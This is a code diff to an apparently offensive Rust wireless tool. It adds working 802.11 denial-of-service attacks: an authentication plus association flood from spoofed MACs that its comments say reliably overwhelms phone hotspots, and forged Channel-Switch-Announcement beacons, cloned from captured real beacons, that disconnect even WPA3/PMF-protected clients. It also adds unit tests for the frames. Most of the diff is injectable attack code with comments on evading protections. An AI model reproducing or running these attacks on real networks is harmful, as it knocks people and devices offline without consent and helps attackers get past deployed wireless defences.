@@ -27,6 +27,7 @@ struct TargetState {
     deauth_count: u64,
     scope: DeauthScope,
     client_filter: Vec<String>,
+    raw_beacon: Option<Vec<u8>>,
 }
 
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
@@ -41,6 +42,7 @@ impl TargetState {
             deauth_count: 0,
             scope: DeauthScope::Broadcast,
             client_filter: t.client_filter.clone(),
+            raw_beacon: t.raw_beacon.clone(),
         }
     }
 }
@@ -62,6 +64,12 @@ fn rebuild_target_states(old: &[TargetState], new_targets: &[Target]) -> Vec<Tar
                     .map(|s| s.scope.clone())
                     .unwrap_or(DeauthScope::Broadcast),
                 client_filter: t.client_filter.clone(),
+                // Prefer a freshly-captured beacon from the new target; keep the
+                // previously-cloned one if the update doesn't carry one.
+                raw_beacon: t
+                    .raw_beacon
+                    .clone()
+                    .or_else(|| prev.and_then(|s| s.raw_beacon.clone())),
             }
         })
         .collect()
@@ -164,6 +172,8 @@ pub fn start_attack(
                             let ch = target_states[idx].channel;
                             let band = target_states[idx].band;
                             let bssid = target_states[idx].bssid.clone();
+                            let ssid = target_states[idx].ssid.clone();
+                            let raw_beacon = target_states[idx].raw_beacon.clone();
                             let scope = target_states[idx].scope.clone();
                             let client_filter = target_states[idx].client_filter.clone();
 
@@ -184,7 +194,11 @@ pub fn start_attack(
                             for _ in 0..burst_size {
                                 match attack_type {
                                     AttackType::AuthDos => {
-                                        send_auth_dos_frame(&mut sender, &bssid);
+                                        send_auth_dos_frame(&mut sender, &bssid, &ssid);
+                                    }
+                                    AttackType::CsaBeacon => {
+                                        let cur = if ch > 0 { ch } else { current_ch };
+                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur, raw_beacon.as_deref());
                                     }
                                     AttackType::Deauth => {
                                         if !client_filter.is_empty() {
@@ -279,13 +293,19 @@ pub fn start_attack(
                             }
 
                             let bssid = target_states[idx].bssid.clone();
+                            let ssid = target_states[idx].ssid.clone();
+                            let raw_beacon = target_states[idx].raw_beacon.clone();
                             let scope = target_states[idx].scope.clone();
                             let client_filter = target_states[idx].client_filter.clone();
                             let ch = target_states[idx].channel;
                             for _ in 0..burst_size {
                                 match attack_type {
                                     AttackType::AuthDos => {
-                                        send_auth_dos_frame(&mut sender, &bssid);
+                                        send_auth_dos_frame(&mut sender, &bssid, &ssid);
+                                    }
+                                    AttackType::CsaBeacon => {
+                                        let cur = if ch > 0 { ch } else { current_ch };
+                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur, raw_beacon.as_deref());
                                     }
                                     AttackType::Deauth => {
                                         if !client_filter.is_empty() {
@@ -450,21 +470,24 @@ pub(crate) fn build_client_deauth_frames(ap_bssid: &str, client_mac: &str) -> (V
     (mk(client, bssid), mk(bssid, client))
 }
 
-/// Auth-flood frame from a spoofed locally-administered MAC — exhausts the AP's
-/// association table.
-pub(crate) fn build_auth_dos_frame(bssid_str: &str) -> Vec<u8> {
-    let bssid = parse_mac(bssid_str);
+/// Next spoofed source MAC for the flood. Locally administered unicast
+/// (first byte bit1 set, bit0 clear) so it never collides with a real client.
+fn next_spoofed_mac() -> [u8; 6] {
     let c = AUTH_COUNTER.fetch_add(1, Ordering::Relaxed).wrapping_add(1);
-    let seq = next_seq();
-    // Locally administered unicast (first byte bit1 set, bit0 clear).
-    let src_mac = [
+    [
         0x02u8,
         ((c >> 32) & 0xFF) as u8,
         ((c >> 24) & 0xFF) as u8,
         ((c >> 16) & 0xFF) as u8,
         ((c >> 8) & 0xFF) as u8,
         (c & 0xFF) as u8,
-    ];
+    ]
+}
+
+/// Open-System auth request from `src_mac` to the AP — step 1 of the
+/// auth→assoc handshake.
+fn build_auth_frame_from(bssid: [u8; 6], src_mac: [u8; 6]) -> Vec<u8> {
+    let seq = next_seq();
     let mut frame = Vec::with_capacity(30);
     frame.extend_from_slice(&0x00B0u16.to_le_bytes()); // FC: auth (subtype 11)
     frame.extend_from_slice(&0x013Au16.to_le_bytes()); // duration
@@ -476,6 +499,140 @@ pub(crate) fn build_auth_dos_frame(bssid_str: &str) -> Vec<u8> {
     frame.extend_from_slice(&0x0001u16.to_le_bytes()); // auth seq 1
     frame.extend_from_slice(&0x0000u16.to_le_bytes()); // status: success
     wrap_radiotap(&frame)
+}
+
+/// Association request from `src_mac` carrying the AP's SSID + a rate set so the
+/// AP accepts it and allocates a real association-table slot — step 2 of the
+/// handshake and the part that actually exhausts AP/firmware resources (this is
+/// what reliably overwhelms a software AP such as an iPhone Personal Hotspot).
+fn build_assoc_frame_from(bssid: [u8; 6], src_mac: [u8; 6], ssid: &str) -> Vec<u8> {
+    let seq = next_seq();
+    let ssid_bytes = ssid.as_bytes();
+    let mut frame = Vec::with_capacity(40 + ssid_bytes.len());
+    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // FC: assoc request (subtype 0)
+    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // duration
+    frame.extend_from_slice(&bssid); // DA = AP
+    frame.extend_from_slice(&src_mac); // SA = spoofed client
+    frame.extend_from_slice(&bssid); // BSSID
+    frame.extend_from_slice(&seq.to_le_bytes());
+    // Fixed params: capability info (ESS + Privacy + Short Preamble + Short Slot).
+    frame.extend_from_slice(&0x0431u16.to_le_bytes());
+    frame.extend_from_slice(&0x000Au16.to_le_bytes()); // listen interval
+    // SSID element (tag 0). Truncated to the 32-byte 802.11 max.
+    let ssid_len = ssid_bytes.len().min(32);
+    frame.push(0x00);
+    frame.push(ssid_len as u8);
+    frame.extend_from_slice(&ssid_bytes[..ssid_len]);
+    // Supported Rates element (tag 1): 1,2,5.5,11,6,9,12,18 Mbps.
+    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
+    // Extended Supported Rates element (tag 50): 24,36,48,54 Mbps.
+    frame.extend_from_slice(&[0x32, 0x04, 0x30, 0x48, 0x60, 0x6c]);
+    wrap_radiotap(&frame)
+}
+
+/// Auth-flood frame from a spoofed locally-administered MAC. Retained for the
+/// unit tests / callers that only need the auth step.
+pub(crate) fn build_auth_dos_frame(bssid_str: &str) -> Vec<u8> {
+    build_auth_frame_from(parse_mac(bssid_str), next_spoofed_mac())
+}
+
+/// Channel a CSA beacon herds victims onto: any channel other than the AP's
+/// current one. The client follows the bogus switch, the real AP stays put, so
+/// the client lands on a channel where its AP isn't → disconnected.
+fn csa_target_channel(cur_channel: u8) -> u8 {
+    if cur_channel == 1 { 11 } else { 1 }
+}
+
+/// Spoofed beacon for the target BSSID carrying a Channel-Switch-Announcement
+/// element. Beacons are NOT protected by 802.11w/PMF, so PMF (WPA3) clients that
+/// ignore plaintext deauth still honour this and switch channel — disconnecting
+/// them from the real AP. `cur_channel` is the AP's actual channel (advertised
+/// in the DS-Param element); the CSA points one channel away.
+pub(crate) fn build_csa_beacon_frame(bssid_str: &str, ssid: &str, cur_channel: u8) -> Vec<u8> {
+    let bssid = parse_mac(bssid_str);
+    let broadcast = [0xFFu8; 6];
+    let seq = next_seq();
+    let ssid_bytes = ssid.as_bytes();
+    let mut frame = Vec::with_capacity(60 + ssid_bytes.len());
+    frame.extend_from_slice(&0x0080u16.to_le_bytes()); // FC: beacon (subtype 8)
+    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
+    frame.extend_from_slice(&broadcast); // DA = broadcast
+    frame.extend_from_slice(&bssid); // SA = spoofed AP
+    frame.extend_from_slice(&bssid); // BSSID
+    frame.extend_from_slice(&seq.to_le_bytes());
+    // Fixed beacon params.
+    frame.extend_from_slice(&[0u8; 8]); // timestamp
+    frame.extend_from_slice(&0x0064u16.to_le_bytes()); // beacon interval 100 TU
+    frame.extend_from_slice(&0x0431u16.to_le_bytes()); // capability (ESS+Privacy+short)
+    // SSID element (tag 0), truncated to 32 bytes.
+    let ssid_len = ssid_bytes.len().min(32);
+    frame.push(0x00);
+    frame.push(ssid_len as u8);
+    frame.extend_from_slice(&ssid_bytes[..ssid_len]);
+    // Supported Rates element (tag 1).
+    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
+    // DS Parameter Set (tag 3): the AP's current channel.
+    frame.extend_from_slice(&[0x03, 0x01, cur_channel]);
+    // Channel Switch Announcement (tag 37): [switch mode, new channel, count].
+    //   switch mode 1 = clients stop TX until the switch completes.
+    //   count 1 = switch after the next beacon (act immediately).
+    frame.extend_from_slice(&[0x25, 0x03, 0x01, csa_target_channel(cur_channel), 0x01]);
+    wrap_radiotap(&frame)
+}
+
+/// Clone a captured real beacon (`raw` = the 802.11 mgmt frame, radiotap and FCS
+/// already stripped) and inject a fresh Channel-Switch-Announcement element. The
+/// result is byte-faithful to the AP's real beacon apart from a refreshed
+/// sequence number and the appended CSA — far more likely to survive a client's
+/// CSA sanity-check than a synthesized beacon. Returns `None` if `raw` is too
+/// short to be a beacon (caller should fall back to synthesis).
+pub(crate) fn build_csa_from_beacon(raw: &[u8], cur_channel: u8) -> Option<Vec<u8>> {
+    // 24-byte MAC header + 12-byte fixed params (timestamp/interval/capability).
+    const IE_START: usize = 24 + 12;
+    if raw.len() < IE_START {
+        return None;
+    }
+    let mut frame = raw.to_vec();
+    // Refresh the sequence-control field (header bytes 22..24) so the spoofed
+    // beacon isn't an obvious replay of a stale sequence number.
+    frame[22..24].copy_from_slice(&next_seq().to_le_bytes());
+    // Drop any CSA element the real beacon already carried, then insert ours at
+    // the front of the IE list (clients accept CSA anywhere in the list).
+    strip_element(&mut frame, IE_START, 0x25);
+    let csa = [0x25u8, 0x03, 0x01, csa_target_channel(cur_channel), 0x01];
+    frame.splice(IE_START..IE_START, csa.iter().copied());
+    Some(wrap_radiotap(&frame))
+}
+
+/// Remove the first information element with `tag` from the IE list that starts
+/// at `ie_start`. No-op if not found or the list is malformed.
+fn strip_element(frame: &mut Vec<u8>, ie_start: usize, tag: u8) {
+    let mut pos = ie_start;
+    while pos + 2 <= frame.len() {
+        let t = frame[pos];
+        let len = frame[pos + 1] as usize;
+        let end = pos + 2 + len;
+        if end > frame.len() {
+            return; // malformed — leave as-is
+        }
+        if t == tag {
+            frame.drain(pos..end);
+            return;
+        }
+        pos = end;
+    }
+}
+
+/// Auth+assoc pair sharing one spoofed MAC — drives the AP through the full
+/// association handshake so each fake client consumes a real table slot.
+/// Returns (auth, assoc).
+pub(crate) fn build_auth_dos_frames(bssid_str: &str, ssid: &str) -> (Vec<u8>, Vec<u8>) {
+    let bssid = parse_mac(bssid_str);
+    let src_mac = next_spoofed_mac();
+    (
+        build_auth_frame_from(bssid, src_mac),
+        build_assoc_frame_from(bssid, src_mac, ssid),
+    )
 }
 
 // ── Senders (Linux pcap injection) ────────────────────────────────────────────
@@ -493,8 +650,26 @@ fn send_client_deauth(cap: &mut pcap::Capture<pcap::Active>, ap_bssid: &str, cli
 }
 
 #[cfg(all(not(feature = "demo"), target_os = "linux"))]
-fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str) {
-    let _ = cap.sendpacket(build_auth_dos_frame(bssid).as_slice());
+fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str, ssid: &str) {
+    let (auth, assoc) = build_auth_dos_frames(bssid, ssid);
+    let _ = cap.sendpacket(auth.as_slice());
+    let _ = cap.sendpacket(assoc.as_slice());
+}
+
+#[cfg(all(not(feature = "demo"), target_os = "linux"))]
+fn send_csa_beacon_frame(
+    cap: &mut pcap::Capture<pcap::Active>,
+    bssid: &str,
+    ssid: &str,
+    cur_channel: u8,
+    raw_beacon: Option<&[u8]>,
+) {
+    // Clone the real captured beacon when available (highest disconnect rate);
+    // otherwise fall back to a synthesized minimal beacon.
+    let frame = raw_beacon
+        .and_then(|raw| build_csa_from_beacon(raw, cur_channel))
+        .unwrap_or_else(|| build_csa_beacon_frame(bssid, ssid, cur_channel));
+    let _ = cap.sendpacket(frame.as_slice());
 }
 
 #[allow(dead_code)]
@@ -658,6 +833,72 @@ mod tests {
         assert_eq!(p[RT + 10] & 0x03, 0x02);
     }
 
+
+    #[test]
+    fn auth_dos_pair_shares_src_and_carries_ssid() {
+        let (auth, assoc) = build_auth_dos_frames("11:22:33:44:55:66", "MyHotspot");
+        // Frame 1 is auth, frame 2 is assoc request.
+        assert_eq!(u16::from_le_bytes([auth[RT], auth[RT + 1]]), 0x00B0); // FC auth
+        assert_eq!(u16::from_le_bytes([assoc[RT], assoc[RT + 1]]), 0x0000); // FC assoc req
+        // Both frames use the SAME spoofed, locally-administered source MAC so the
+        // AP progresses one fake client through the full auth→assoc handshake.
+        assert_eq!(assoc[RT + 10] & 0x03, 0x02);
+        assert_eq!(&auth[RT + 10..RT + 16], &assoc[RT + 10..RT + 16]);
+        // Assoc body carries the SSID element (tag 0) after the 4-byte fixed params
+        // (capability + listen interval) that follow the 24-byte MAC header.
+        let ssid_tag = RT + 24 + 4;
+        assert_eq!(assoc[ssid_tag], 0x00); // SSID element id
+        assert_eq!(assoc[ssid_tag + 1] as usize, "MyHotspot".len());
+        assert_eq!(&assoc[ssid_tag + 2..ssid_tag + 2 + 9], b"MyHotspot");
+    }
+
+    #[test]
+    fn csa_beacon_announces_channel_switch() {
+        let p = build_csa_beacon_frame("AA:BB:CC:DD:EE:FF", "Net", 6);
+        assert_eq!(u16::from_le_bytes([p[RT], p[RT + 1]]), 0x0080); // FC beacon
+        assert_eq!(&p[RT + 4..RT + 10], &[0xFF; 6]); // DA broadcast
+        assert_eq!(&p[RT + 10..RT + 16], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]); // SA = AP
+        // CSA element (tag 37) must be present and point off the current channel.
+        let body = &p[RT..];
+        let csa = body
+            .windows(2)
+            .position(|w| w == [0x25, 0x03])
+            .expect("CSA element present");
+        assert_eq!(body[csa + 2], 0x01); // switch mode = stop TX
+        assert_ne!(body[csa + 3], 6); // new channel ≠ current
+        assert_eq!(body[csa + 4], 0x01); // switch count
+    }
+
+    #[test]
+    fn csa_clone_injects_csa_and_strips_old() {
+        // Minimal real beacon: 24B hdr + 12B fixed + SSID IE + a stale CSA IE.
+        let mut raw = vec![0u8; 24];
+        raw[0] = 0x80; // beacon FC
+        raw[16..22].copy_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]); // BSSID
+        raw.extend_from_slice(&[0u8; 8]); // timestamp
+        raw.extend_from_slice(&0x0064u16.to_le_bytes()); // interval
+        raw.extend_from_slice(&0x0431u16.to_le_bytes()); // capability
+        raw.extend_from_slice(&[0x00, 0x03, b'N', b'e', b't']); // SSID IE
+        raw.extend_from_slice(&[0x25, 0x03, 0x01, 0x09, 0x05]); // stale CSA (ch 9)
+
+        let p = build_csa_from_beacon(&raw, 6).expect("clone");
+        let body = &p[RT..];
+        // Our CSA sits at the front of the IE list (right after fixed params).
+        let ie_start = 24 + 12;
+        assert_eq!(&body[ie_start..ie_start + 2], &[0x25, 0x03]);
+        assert_ne!(body[ie_start + 3], 6); // points off current channel
+        assert_eq!(body[ie_start + 4], 0x01); // fresh switch count, not the stale 5
+        // Exactly one CSA element remains (stale one stripped).
+        let csa_count = body.windows(2).filter(|w| *w == [0x25u8, 0x03]).count();
+        assert_eq!(csa_count, 1);
+        // Original BSSID preserved (true clone).
+        assert_eq!(&body[16..22], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
+    }
+
+    #[test]
+    fn csa_clone_rejects_short_frame() {
+        assert!(build_csa_from_beacon(&[0u8; 10], 6).is_none());
+    }
 
     #[test]
     fn seq_advances() {
